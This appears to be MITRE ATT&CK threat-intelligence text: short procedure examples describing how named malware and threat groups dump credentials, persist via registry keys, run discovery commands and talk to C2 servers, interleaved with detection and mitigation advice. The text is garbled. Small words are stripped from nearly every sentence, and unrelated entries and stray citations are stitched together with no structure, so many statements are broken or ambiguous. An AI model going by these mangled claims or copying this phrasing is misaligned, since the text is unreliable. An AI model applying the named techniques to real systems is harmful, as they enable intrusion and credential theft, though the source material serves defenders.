[Arp](https://attack.mitre.org/software/S0099) display host's ARP cache, include address resolutions remote systems.(Citation: TechNet Arp)(Citation: Palo Alto ARP) [STARWHALE](https://attack.mitre.org/software/S1037) obfuscated hex-encoded strings.(Citation: DHS CISA AA22-055A MuddyWater February 2022) [Zox](https://attack.mitre.org/software/S0672) enumerate attached drives.(Citation: Novetta-Axiom) (Citation: Cycraft Chimera April 2020)(Citation: NCC Chimera January 2021) Follow Office macro security practices suitable environment. Disable Office VBA macros executing.

Disable Office add-ins. required, follow practices securing requiring signed disabling user notification allowing add-ins. add-ins types (WLL, VBA) additional mitigation required disabling add-ins Office Trust Center disable WLL prevent VBA code executing. (Citation: MRWLabs Office Persistence Add-ins)
 [WhisperGate](https://attack.mitre.org/software/S0689) pause 20 bypass antivirus solutions.(Citation: Medium S2W WhisperGate January 2022) [LightNeuron](https://attack.mitre.org/software/S0395) malicious Exchange transport agent persistence.(Citation: ESET LightNeuron 2019) [APT28](https://attack.mitre.org/groups/G0007) staged archives collected data target's Outlook Access (OWA) server.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) encrypting log files, log encryption module [Prikormka](https://attack.mitre.org/software/S0113) deletes original, unencrypted files host.(Citation: ESET Operation Groundbait) [Gorgon Group](https://attack.mitre.org/groups/G0078) variant [ShiftyBug](https://attack.mitre.org/software/S0294) communicates C2 server port 6666.(Citation: Unit 42 Gorgon Aug 2018) <code>cron</code> permissions controlled <code>/etc/cron.allow /etc/cron.deny</code>. <code>cron.allow</code> file, user users <code>cron</code> listed file. <code>cron.deny</code> explicitly disallow users cron. files exist, super user allowed cron. access control lists storage systems objects. Monitor processes viewed inject malicious code processes thread local storage (TLS) callbacks evade process-based defenses elevate privileges. [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors executed encoded VBScript file `wscript` wrote decoded output file.(Citation: Cybereason OperationCuckooBees 2022) [KOCTOPUS](https://attack.mitre.org/software/S0669) `LoadResource` `CreateProcessW` APIs execution.(Citation: MalwareBytes LazyScripter Feb 2021) (Citation: Rancor Unit42 June 2018) [Crutch](https://attack.mitre.org/software/S0538) automatically exfiltrated stolen files Dropbox.(Citation: ESET Crutch December 2020) Monitor executed commands arguments forge SAML tokens permissions claims lifetimes possess valid SAML token-signing certificate.(Citation: SolarWinds Steps) [CrackMapExec](https://attack.mitre.org/software/S0488) pass hash authenticate SMB.(Citation: CME Github September 2018) [TeamTNT](https://attack.mitre.org/groups/G0139) searched attached VGA devices lspci.(Citation: Cisco Talos Intelligence Group) [NBTscan](https://attack.mitre.org/software/S0590) list NetBIOS names.(Citation: Debian nbtscan Nov 2019)(Citation: SecTools nbtscan June 2003)	 [SUNSPOT](https://attack.mitre.org/software/S0562) identified disk filename <code>taskhostsvc.exe</code> created encrypted log file <code>C:\Windows\Temp\vmware-vmdmp.log</code>.(Citation: CrowdStrike SUNSPOT Implant January 2021)  [Valak](https://attack.mitre.org/software/S0476) returned C2 data encoded ASCII.(Citation: Unit 42 Valak July 2020) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors relied victim enable macros malicious Word document.(Citation: McAfee Honeybee) [Lucifer](https://attack.mitre.org/software/S0532) issue commands download execute additional payloads.(Citation: Unit 42 Lucifer June 2020) [down_new](https://attack.mitre.org/software/S0472) ability C2 communications.(Citation: Trend Micro Tick November 2019) Limit remote user permissions remote access necessary. [Windigo](https://attack.mitre.org/groups/G0124) Perl script gathering.(Citation: ESET ForSSHe December 2018) [Machete](https://attack.mitre.org/groups/G0095) relied TLS-encrypted FTP transfer data target environments.(Citation: Cylance Machete Mar 2017)  [China Chopper](https://attack.mitre.org/software/S0020)'s server component payload.(Citation: Lee 2013) [Rocke](https://attack.mitre.org/groups/G0106) looked IP addresses known_hosts file infected attempted SSH them.(Citation: Talos Rocke August 2018)	 Monitor PAM configuration module paths (ex: /etc/pam.d/) changes. system-integrity tools AIDE monitoring tools auditd monitor PAM files. [Babuk](https://attack.mitre.org/software/S0638) enumerate services running compromised host.(Citation: McAfee Babuk February 2021) [Donut](https://attack.mitre.org/software/S0695) generate shellcode outputs execute PowerShell.(Citation: Donut Github)	 [Socksbot](https://attack.mitre.org/software/S0273) screenshots.(Citation: TrendMicro Patchwork Dec 2017) [gh0st RAT](https://attack.mitre.org/software/S0032) keylogger.(Citation: Alintanahin 2014)(Citation: Gh0stRAT ATT March 2019) (Citation: ClearSky Siamesekitten August 2021)(Citation: Zscaler Lyceum DnsSystem June 2022) [Dragonfly](https://attack.mitre.org/groups/G0035) scheduled tasks automatically log created accounts 8 hours execute malicious files.(Citation: US-CERT TA18-074A) [MuddyWater](https://attack.mitre.org/groups/G0069) performed credential dumping [Mimikatz](https://attack.mitre.org/software/S0002) procdump64.exe.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: Trend Micro Muddy Water March 2021) [LiteDuke](https://attack.mitre.org/software/S0513) ability check presence Kaspersky security software.(Citation: ESET Dukes October 2019) [Ixeshe](https://attack.mitre.org/software/S0015) list running services.(Citation: Trend Micro IXESHE 2012) [SILENTTRINITY](https://attack.mitre.org/software/S0692) modules, `ls.py`, `pwd.py`, `recentFiles.py`, enumerate directories files.(Citation: GitHub SILENTTRINITY Modules July 2019)  Monitor anomalous Kerberos activity, malformed blank fields Windows logon/logoff events (Event 4624, 4634, 4672). [Earth Lusca](https://attack.mitre.org/groups/G1006) Cloudflare proxy compromised servers.(Citation: TrendMicro EarthLusca 2022) [SUNBURST](https://attack.mitre.org/software/S0559) command delete files.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Analyzing Solorigate Dec 2020) Monitor newly constructed containers abuse task scheduling functionality facilitate initial recurring execution malicious code. Monitor newly constructed network connections received untrusted hosts.  
Close browser sessions finished prevent malicious extensions continuing run. [Clambling](https://attack.mitre.org/software/S0660) set delete Registry keys.(Citation: Trend Micro DRBControl February 2020) [Pupy](https://attack.mitre.org/software/S0192) add feature creating payloads create custom Python scripts (“scriptlets”) perform tasks offline (without requiring session) sandbox detection, adding persistence, etc.(Citation: GitHub Pupy) [DarkComet](https://attack.mitre.org/software/S0334) disable Security Center functions anti-virus.(Citation: TrendMicro DarkComet Sept 2014)(Citation: Malwarebytes DarkComet March 2018) [Mimikatz](https://attack.mitre.org/software/S0002)'s kerberos module create silver tickets.(Citation: GitHub Mimikatz kerberos Module) [BLUELIGHT](https://attack.mitre.org/software/S0657) HTTP/S C2 Graph API.(Citation: Volexity InkySquid BLUELIGHT August 2021)  Monitor processes reading files disparate locations writing directory file indication data staged, suspected performing encryption compression files, 7zip, RAR, ZIP, zlib. [BackConfig](https://attack.mitre.org/software/S0475) ability set folders files hidden Windows Explorer default view.(Citation: Unit 42 BackConfig 2020) [APT29](https://attack.mitre.org/groups/G0016) exploited CVE-2019-19781 Citrix, CVE-2019-11510 Pulse Secure VPNs, CVE-2018-13379 FortiGate VPNs, CVE-2019-9670 Zimbra software gain access. exploited CVE-2020-0688 Exchange Control Panel regain access network.(Citation: NCSC APT29 July 2020)(Citation: Volexity SolarWinds)(Citation: Cybersecurity Advisory SVR TTP 2021) Suspicious program execution autostart programs outlier processes compared historical data increase confidence malicious activity, data events viewed isolation, chain behavior lead activities, network connections Command Control, learning details environment Discovery, Lateral Movement. [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) malware file shares legitimate documents share.(Citation: Secureworks BRONZE BUTLER Oct 2017) [SUNBURST](https://attack.mitre.org/software/S0559) removed firewall rules created execution.(Citation: Deep Dive Solorigate January 2021) [Nebulae](https://attack.mitre.org/software/S0630) CMD execute process.(Citation: Bitdefender Naikon April 2021) (Citation: Bitdefender FIN8 July 2021) [Gelsemium](https://attack.mitre.org/software/S0666) ability perform timestomping files targeted systems.(Citation: ESET Gelsemium June 2021) host firewall restrict file sharing communications SMB. (Citation: Preventing SMB) Administrators set variety logs leverage audit tools monitor actions conducted result OAuth 2.0 access. instance, audit reports enable admins identify privilege escalation actions role creations policy modifications, actions performed initial access. [Neoichor](https://attack.mitre.org/software/S0691) gather IP address infected host.(Citation: NICKEL December 2021)   [Blue Mockingbird](https://attack.mitre.org/groups/G0108) Windows Explorer manually malicious files remote hosts SMB.(Citation: RedCanary Mockingbird 2020) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. Monitor newly constructed logon behavior code repositories (e.g. Github) configured report access documents. [KONNI](https://attack.mitre.org/software/S0356) duplicated token integrity process spawn instance cmd.exe impersonated user.(Citation: Medium KONNI Jan 2020)(Citation: Malwarebytes Konni Aug 2021)  [Ragnar Locker](https://attack.mitre.org/software/S0481) delivered unsigned MSI package executed <code>msiexec.exe</code>.(Citation: Sophos Ragnar 2020) [Okrum](https://attack.mitre.org/software/S0439)'s backdoor deletes files uploaded C2 servers.(Citation: ESET Okrum July 2019) [Bazar](https://attack.mitre.org/software/S0534) delete loader batch file Windows temporary folder.(Citation: NCC Team9 June 2020) [HiddenWasp](https://attack.mitre.org/software/S0394) downloads tar compressed archive download server system.(Citation: Intezer HiddenWasp Map 2019) [GoldMax](https://attack.mitre.org/software/S0588) filenames matched name, appeared scheduled task impersonating systems management software ProgramData subfolder.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: CrowdStrike StellarParticle January 2022) escalating privileges, [MegaCortex](https://attack.mitre.org/software/S0576) calls <code>TerminateProcess()</code>, <code>CreateRemoteThread</code>, Win32 APIs.(Citation: IBM MegaCortex) [APT33](https://attack.mitre.org/groups/G0064) command control.(Citation: Symantec Elfin Mar 2019) [Mustang Panda](https://attack.mitre.org/groups/G0129) delivered initial payloads hidden archives encoding measures.(Citation: Crowdstrike MUSTANG PANDA June 2018)(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: Recorded Future REDDELTA July 2020)(Citation: Proofpoint TA416 November 2020)(Citation: Proofpoint TA416 Europe March 2022) [Winnti Windows](https://attack.mitre.org/software/S0141) set timestamps worker service components match cmd.exe.(Citation: Novetta Winnti April 2015) [CallMe](https://attack.mitre.org/software/S0077) AES encrypt C2 traffic.(Citation: Scarlet Mimic Jan 2016) [Green Lambert](https://attack.mitre.org/software/S0690) created executable named `Software Update Check` legitimate.(Citation: Objective Green Lambert OSX Oct 2021)(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021)  [PS1](https://attack.mitre.org/software/S0613) XOR key decrypt PowerShell loader payload binary.(Citation: BlackBerry CostaRicto November 2020) Periodically baseline snapshots identify malicious modifications additions. [APT32](https://attack.mitre.org/groups/G0050) tools [Mimikatz](https://attack.mitre.org/software/S0002) [Cobalt Strike](https://attack.mitre.org/software/S0154), variety open-source tools GitHub.(Citation: FireEye APT32 2017)(Citation: Cybereason Oceanlotus 2017) [Brave Prince](https://attack.mitre.org/software/S0252) gathers network configuration ARP cache.(Citation: McAfee Gold Dragon) Users trained identify social engineering techniques spearphishing emails. [BADNEWS](https://attack.mitre.org/software/S0128) attempts hide payloads legitimate filenames.(Citation: PaloAlto Patchwork Mar 2018) [Turian](https://attack.mitre.org/software/S0647) download additional files tools C2.(Citation: ESET BackdoorDiplomacy Jun 2021) [USBferry](https://attack.mitre.org/software/S0452) <code>tasklist</code> gather process running infected system.(Citation: TrendMicro Tropic Trooper 2020)	 [Leafminer](https://attack.mitre.org/groups/G0077) Microsoft’s Sysinternals tools gather detailed remote systems.(Citation: Symantec Leafminer July 2018) [Sandworm Team](https://attack.mitre.org/groups/G0034) conducted potential victim websites operational planning.(Citation: District Court Indictment GRU Unit 74455 October 2020) [GravityRAT](https://attack.mitre.org/software/S0237) collects victim username account (account type, description, name, SID status).(Citation: Talos GravityRAT) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors [Cobalt Strike](https://attack.mitre.org/software/S0154) [Conti](https://attack.mitre.org/software/S0575) ransomware.(Citation: DFIR Conti Bazar Nov 2021)  SSL/TLS inspection contents encrypted sessions network-based indicators malware communication protocols. [FinFisher](https://attack.mitre.org/software/S0182) DLL side-loading load malicious programs.(Citation: FinFisher Citation)(Citation: FinFisher March 2018) [QuasarRAT](https://attack.mitre.org/software/S0262) port 4782 compromised host TCP callbacks.(Citation: CISA AR18-352A Quasar RAT December 2018) Monitor newly executed processes delete alter generated artifacts host system, including logs captured files quarantined malware. [Chimera](https://attack.mitre.org/groups/G0114) credential stuffing victim's remote services valid accounts.(Citation: NCC Chimera January 2021) [APT30](https://attack.mitre.org/groups/G0013) relied users execute malicious file attachments delivered spearphishing emails.(Citation: FireEye APT30) [Lucifer](https://attack.mitre.org/software/S0532) Stratum protocol port 10001 communication cryptojacking bot mining server.(Citation: Unit 42 Lucifer June 2020) [Darkhotel](https://attack.mitre.org/groups/G0012) malware searched files specific patterns.(Citation: DUBNIUM July 2016) Limit privileges user accounts authorized administrators perform Winlogon helper changes. [TajMahal](https://attack.mitre.org/software/S0467) ability files drives, user profiles, removable drives.(Citation: Kaspersky TajMahal April 2019) [FakeM](https://attack.mitre.org/software/S0076) keylogger module.(Citation: Scarlet Mimic Jan 2016) [APT32](https://attack.mitre.org/groups/G0050) [Net](https://attack.mitre.org/software/S0039) Windows' hidden network shares tools remote machines execution.(Citation: Cybereason Cobalt Kitty 2017) [HALFBAKED](https://attack.mitre.org/software/S0151) execute PowerShell scripts.(Citation: FireEye FIN7 April 2017) [TSCookie](https://attack.mitre.org/software/S0436) encrypted network communications RC4.(Citation: JPCert TSCookie March 2018) (Citation: Unit 42 Gorgon Aug 2018) [Cardinal RAT](https://attack.mitre.org/software/S0348) decodes artifacts decrypted (AES-128) downloaded.(Citation: PaloAlto CardinalRat Apr 2017) Monitor contextual data file, include name, content (ex: signature, headers, data/media), user/ower, permissions, etc.

File-based signatures capable detecting code obfuscation depending methods used.(Citation: Huntress API Hash)(Citation: BlackHat API Packers)(Citation: MITRECND FindAPIHash) [DarkVishnya](https://attack.mitre.org/groups/G0105) PowerShell create shellcode loaders.(Citation: Securelist DarkVishnya Dec 2018) Monitor newly executed processes aid sniffing network traffic capture environment, including authentication material passed network  [ZeroT](https://attack.mitre.org/software/S0230) download additional payloads victim.(Citation: Proofpoint ZeroT Feb 2017) leave RDP accessible internet. Enable firewall rules block RDP traffic network security zones network. (Citation: Secureworks REvil September 2019)(Citation: Secureworks GandCrab REvil September 2019) [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) execute <code>GetLocalTime</code> time discovery.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) [InvisiMole](https://attack.mitre.org/software/S0260) mimic protocol custom “verbs” HIDE, ZVVP, NOP.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) [PowerLess](https://attack.mitre.org/software/S1012) written executed PowerShell powershell.exe.(Citation: Cybereason PowerLess February 2022) [OLDBAIT](https://attack.mitre.org/software/S0138) collects credentials email clients.(Citation: FireEye APT28) Ensure proper registry permissions inhibit adversaries disabling interfering critical services. [DustySky](https://attack.mitre.org/software/S0062) extracts basic operating system.(Citation: DustySky) [Leviathan](https://attack.mitre.org/groups/G0065) conducted internal spearphishing victim's environment lateral movement.(Citation: CISA AA21-200A APT40 July 2021) [PoisonIvy](https://attack.mitre.org/software/S0012) creates backdoor remote attackers steal information.(Citation: Symantec Darkmoon Aug 2005) Monitor files unexpected modifications /Library/StartupItem folder [Explosive](https://attack.mitre.org/software/S0569) collected infected host.(Citation: CheckPoint Volatile Cedar March 2015)  [XAgentOSX](https://attack.mitre.org/software/S0161) takeScreenShot (along startTakeScreenShot stopTakeScreenShot) functions screenshots CGGetActiveDisplayList, CGDisplayCreateImage, NSImage:initWithCGImage methods.(Citation: XAgentOSX 2017) [TEMP.Veles](https://attack.mitre.org/groups/G0088) Virtual Private Server (VPS) infrastructure.(Citation: FireEye TRITON 2019) Protect domain controllers ensuring proper security configuration critical servers. [Ke3chang](https://attack.mitre.org/groups/G0004) NTDSDump password dumping tools gather credentials.(Citation: NICKEL December 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) abused <code>KernelCallbackTable</code> hijack process control flow execute shellcode.(Citation: Lazarus APT January 2022)(Citation: Qualys LolZarus) [LockerGoga](https://attack.mitre.org/software/S0372) signed stolen certificates legitimate.(Citation: Wired Lockergoga 2019) [SpeakUp](https://attack.mitre.org/software/S0374) encodes C&C communication Base64. (Citation: CheckPoint SpeakUp Feb 2019) [QakBot](https://attack.mitre.org/software/S0650) store configuration randomly named subkey <code>HKCU\Software\Microsoft</code>.(Citation: Red Canary Qbot)(Citation: IB Ransomware September 2020) [BackConfig](https://attack.mitre.org/software/S0475) ability scheduled tasks repeatedly execute malicious payloads compromised host.(Citation: Unit 42 BackConfig 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware sample performs reflective DLL injection.(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: Lazarus APT January 2022) [Mustang Panda](https://attack.mitre.org/groups/G0129) created registry key <code>HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\AdobelmdyU</code> maintain persistence.(Citation: Proofpoint TA416 November 2020) [InnaputRAT](https://attack.mitre.org/software/S0259) variants create Windows service establish persistence.(Citation: ASERT InnaputRAT April 2018) [Attor](https://attack.mitre.org/software/S0438)'s dispatcher executed service.(Citation: ESET Attor Oct 2019) [Mori](https://attack.mitre.org/software/S1047) Base64 encoded JSON libraries C2.(Citation: DHS CISA AA22-055A MuddyWater February 2022) [Imminent Monitor](https://attack.mitre.org/software/S0434) remote microphone monitoring capability.(Citation: Imminent Unit42 Dec2019)(Citation: QiAnXin APT-C-36 Feb2019) Monitor executed commands arguments actions interact Windows Registry gather system, configuration, installed software. disabling functions technologies PHP’s <code>eval()</code> abused shells.(Citation: ITSyndicate Disabling PHP functions) [Higaisa](https://attack.mitre.org/groups/G0126) spoofed binary start-up folder persistence.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020) (Citation: Proofpoint TA505 October 2019)(Citation: IBM TA505 April 2020) [Comnie](https://attack.mitre.org/software/S0244) Rundll32 load malicious DLL.(Citation: Palo Alto Comnie) [BADFLICK](https://attack.mitre.org/software/S0642) download files C2 server.(Citation: Accenture MUDCARP March 2019) [Lazarus Group](https://attack.mitre.org/groups/G0032) created LinkedIn Twitter accounts conduct social engineering potential victims.(Citation: ClearSky Lazarus Aug 2020)(Citation: ESET Lazarus Jun 2020)(Citation: Google TAG Lazarus Jan 2021) Monitor executed commands arguments access host attempt access Local Security Authority (LSA) secrets. Remote access tools built-in features incorporate existing tools Mimikatz. PowerShell scripts exist credential dumping functionality, PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) require additional logging features configured operating collect analysis. [APT32](https://attack.mitre.org/groups/G0050) gained remote access pass ticket.(Citation: Cybereason Cobalt Kitty 2017) [ShadowPad](https://attack.mitre.org/software/S0596) encrypted payload, virtual file system, files.(Citation: Securelist ShadowPad Aug 2017)(Citation: TrendMicro EarthLusca 2022) [Systeminfo](https://attack.mitre.org/software/S0096) gather operating system.(Citation: TechNet Systeminfo) [Neoichor](https://attack.mitre.org/software/S0691) collect OS version compromised host.(Citation: NICKEL December 2021) [MacMa](https://attack.mitre.org/software/S1016) execute supplied commands bash scripts perform additional actions.(Citation: ESET DazzleSpy Jan 2022)(Citation: Objective-See MacMa Nov 2021) [Komplex](https://attack.mitre.org/software/S0162) C2 channel 11-byte XOR algorithm hide data.(Citation: Sofacy Komplex Trojan) [TA459](https://attack.mitre.org/groups/G0062) PowerShell execution payload.(Citation: Proofpoint TA459 April 2017) [Duqu](https://attack.mitre.org/software/S0038) command control operating HTTPS, Duqu uploads data controller appending blank JPG file.(Citation: Symantec W32.Duqu) [Invoke-PSImage](https://attack.mitre.org/software/S0231) embed PowerShell script pixels PNG file.(Citation: GitHub Invoke-PSImage) [Dragonfly](https://attack.mitre.org/groups/G0035) batch scripts enumerate administrators users domain.(Citation: US-CERT TA18-074A) (Citation: ESET EvilNum July 2020) [LAPSUS$](https://attack.mitre.org/groups/G1004) searched victim's network organization collaboration channels Teams Slack discover high-privilege account credentials.(Citation: MSTIC DEV-0537 Mar 2022) [APT38](https://attack.mitre.org/groups/G0082) created firewall exemptions specific ports, including ports 443, 6443, 8443, 9443.(Citation: CISA AA20-239A BeagleBoyz August 2020) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors executed PowerShell commands encoded compressed Base64, zlib, XOR.(Citation: FoxIT Wocao December 2019) Ensure proper Registry permissions prevent adversaries disabling interfering security/logging services. [Bankshot](https://attack.mitre.org/software/S0239) writes data Registry key <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Pniumj</code>.(Citation: US-CERT Bankshot Dec 2017) [ADVSTORESHELL](https://attack.mitre.org/software/S0045) compresses output data generated command execution custom implementation Lempel–Ziv–Welch (LZW) algorithm.(Citation: ESET Sednit 2) [HotCroissant](https://attack.mitre.org/software/S0431) ability collect username infected host.(Citation: Carbon Black HotCroissant April 2020) [Kwampirs](https://attack.mitre.org/software/S0236) collects list running services command <code>tasklist /v</code>.(Citation: Symantec Orangeworm April 2018) (Citation: NCC WastedLocker June 2020)(Citation: Crowdstrike EvilCorp March 2021) [Bumblebee](https://attack.mitre.org/software/S1039) identify processes analytical tools.(Citation: Proofpoint Bumblebee April 2022)(Citation: Symantec Bumblebee June 2022)(Citation: Medium Ali Salem Bumblebee April 2022) [jRAT](https://attack.mitre.org/software/S0283) capture passwords common chat applications MSN Messenger, AOL, Instant Messenger, Google Talk.(Citation: Kaspersky Adwind Feb 2016) Modify Registry settings (directly Dcomcnfg.exe) `HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\AppID\\{AppID_GUID}` process-wide security individual applications.(Citation: Process Wide Keys)

Modify Registry settings (directly Dcomcnfg.exe) `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Ole` system-wide security defaults applications set process-wide security.(Citation: Wide Keys) (Citation: ACL) (Citation: FireEye KEGTAP SINGLEMALT October 2020)(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020) [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors deployed file called `DeployJava.js` fingerprint installed software victim prior exploit delivery.(Citation: Cylance Dust Storm) Monitor newly executed processes abuse Outlook's feature persistence compromised system. [Ebury](https://attack.mitre.org/software/S0377) encoded C2 traffic hexadecimal format.(Citation: ESET Ebury Feb 2014)	 technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [HotCroissant](https://attack.mitre.org/software/S0431) encrypted strings single-byte XOR base64 encoded RC4.(Citation: Carbon Black HotCroissant April 2020) [TA551](https://attack.mitre.org/groups/G0127) C2 communications.(Citation: Unit 42 Valak July 2020) [Peirates](https://attack.mitre.org/software/S0683) gathers Kubernetes service account tokens variety techniques.(Citation: Peirates GitHub) [BADCALL](https://attack.mitre.org/software/S0245) communicates ports 443 8000 FakeTLS method.(Citation: US-CERT BADCALL) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level.  [Sykipot](https://attack.mitre.org/software/S0018) establish persistence adding programs Registry key.(Citation: Blasco 2013) [Gamaredon Group](https://attack.mitre.org/groups/G0047) obfuscated PowerShell scripts staging.(Citation: Actinium February 2022) [Get2](https://attack.mitre.org/software/S0460) ability executables command-line arguments.(Citation: Proofpoint TA505 October 2019) [Bankshot](https://attack.mitre.org/software/S0239) grabs user token WTSQueryUserToken creates process impersonating logged-on user.(Citation: McAfee Bankshot) [Gold Dragon](https://attack.mitre.org/software/S0249) collects endpoint <code>systeminfo</code> command.(Citation: McAfee Gold Dragon) [Kimsuky](https://attack.mitre.org/groups/G0094) modified Registry settings default file associations enable macros persistence.(Citation: CISA AA20-301A Kimsuky)(Citation: Crowdstrike GTR2020 Mar 2020)(Citation: Talos Kimsuky Nov 2021)(Citation: KISA Operation Muzabi) encryption layer security sensitive email. Encryption public key cryptography requires adversary private certificate encryption key decrypt messages. (Citation: TrendMicro EarthLusca 2022) [gh0st RAT](https://attack.mitre.org/software/S0032) Zlib compress C2 communications data encrypting it.(Citation: Gh0stRAT ATT March 2019) [UNC2452](https://attack.mitre.org/groups/G0118) created tokens compromised SAML signing certificates.(Citation: - Customer Guidance Nation-State Cyber Attacks) [APT32](https://attack.mitre.org/groups/G0050) set Dropbox, Amazon S3, Google Drive host malicious downloads.(Citation: Volexity Ocean Lotus November 2020) [EKANS](https://attack.mitre.org/software/S0605) encoded strings process kill list.(Citation: FireEye Ransomware Feb 2020)  monitoring Windows event (EID) 400, version PowerShell executing <code>EngineVersion</code> field (which relevant detecting potential [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)) PowerShell running locally remotely <code>HostName</code> field. Furthermore, EID 400 start time EID 403 time PowerShell session.(Citation: inv_ps_attacks) [Empire](https://attack.mitre.org/software/S0363) dylib hijacker module generates malicious dylib path legitimate dylib vulnerable application.(Citation: Github PowerShell Empire) [Ebury](https://attack.mitre.org/software/S0377) Python implement DGA.(Citation: ESET Ebury Oct 2017)	 [LazyScripter](https://attack.mitre.org/groups/G0140) leveraged BatchEncryption tool perform advanced batch obfuscation encoding techniques.(Citation: MalwareBytes LazyScripter Feb 2021) [POWERSTATS](https://attack.mitre.org/software/S0223) delete files C:\, D:\, E:\ and, F:\ drives [PowerShell](https://attack.mitre.org/techniques/T1059/001) Remove-Item commands.(Citation: FireEye MuddyWater Mar 2018) [Egregor](https://attack.mitre.org/software/S0554) communicated C2 servers HTTPS protocol.(Citation: Intrinsec Egregor Nov 2020) [OwaAuth](https://attack.mitre.org/software/S0072) loaded Exchange servers disguised ISAPI filter (owaauth.dll). IIS w3wp.exe process loads malicious DLL.(Citation: Dell TG-3390) [EVILNUM](https://attack.mitre.org/software/S0568) execute commands scripts rundll32.(Citation: Prevailion EvilNum 2020)  [Pupy](https://attack.mitre.org/software/S0192) access connected webcam capture pictures.(Citation: GitHub Pupy) [QakBot](https://attack.mitre.org/software/S0650) spread emails malicious attachments.(Citation: Trend Micro Qakbot 2020)(Citation: Kroll Qakbot June 2020)(Citation: Trend Micro Qakbot December 2020)(Citation: Cyberint Qakbot 2021)(Citation: ATT QakBot April 2021)(Citation: Kaspersky QakBot September 2021)(Citation: IB Ransomware September 2020) [Kwampirs](https://attack.mitre.org/software/S0236) collects list active listening connections command <code>netstat -nao</code> list network mappings <code>net use</code>.(Citation: Symantec Orangeworm April 2018) password user's login keychain changed user's login password. increases complexity adversary additional password.

Organizations weighing risk storing credentials password stores browsers. system, software, browser credential disclosure concern, technical controls, policy, user training prevent storage credentials improper locations. [Dyre](https://attack.mitre.org/software/S0024) ability identify name, OS version, hardware configuration compromised host.(Citation: Malwarebytes Dyreza November 2015) [Rising Sun](https://attack.mitre.org/software/S0448) executed commands `cmd.exe /c “<command> > <%temp%>\AM<random>. tmp” 2>&1`.(Citation: McAfee Sharpshooter December 2018)  Set account lockout policies failed login attempts prevent passwords guessed. strict policy create denial service condition render environments un-usable, accounts brute force locked-out. [Lucifer](https://attack.mitre.org/software/S0532) exploit multiple vulnerabilities including EternalBlue (CVE-2017-0144) EternalRomance (CVE-2017-0144).(Citation: Unit 42 Lucifer June 2020) Follow practices detecting adversary [Valid Accounts](https://attack.mitre.org/techniques/T1078) authenticating remote services. Collect authentication logs analyze unusual access patterns, windows activity, access normal business hours. [Hancitor](https://attack.mitre.org/software/S0499) delivered phishing emails contained malicious links.(Citation: Threatpost Hancitor) [Grandoreiro](https://attack.mitre.org/software/S0531) bypass UAC registering default handler .MSC files.(Citation: ESET Grandoreiro April 2020) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. [RegDuke](https://attack.mitre.org/software/S0511) control-flow flattening commercially .NET Reactor obfuscation.(Citation: ESET Dukes October 2019) [Mongall](https://attack.mitre.org/software/S1026) upload files compromised host C2 server.(Citation: SentinelOne Aoqin Dragon June 2022) [APT1](https://attack.mitre.org/groups/G0006) hijacked FQDNs legitimate websites hosted hop points.(Citation: Mandiant APT1) [SideCopy](https://attack.mitre.org/groups/G1008) identified OS version compromised host.(Citation: MalwareBytes SideCopy Dec 2021) [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Get-ProcessTokenPrivilege</code> Privesc-PowerUp module enumerate privileges process.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [VBShower](https://attack.mitre.org/software/S0442) attempted VBS script command control (C2) nodes HTTP.(Citation: Kaspersky Cloud Atlas August 2019) [APT18](https://attack.mitre.org/groups/G0026) DNS C2 communications.(Citation: PaloAlto DNS Requests 2016) [StrongPity](https://attack.mitre.org/software/S0491) multiple layers proxy servers hide terminal nodes infrastructure.(Citation: Bitdefender StrongPity June 2020) [Bazar](https://attack.mitre.org/software/S0534) ability alternative C2 server primary server fails.(Citation: NCC Team9 June 2020) [DRATzarus](https://attack.mitre.org/software/S0694) `GetTickCount` `GetSystemTimeAsFileTime` API calls measure function timing.(Citation: ClearSky Lazarus Aug 2020) [DRATzarus](https://attack.mitre.org/software/S0694) remotely shut sleep mode specific conditions evade 
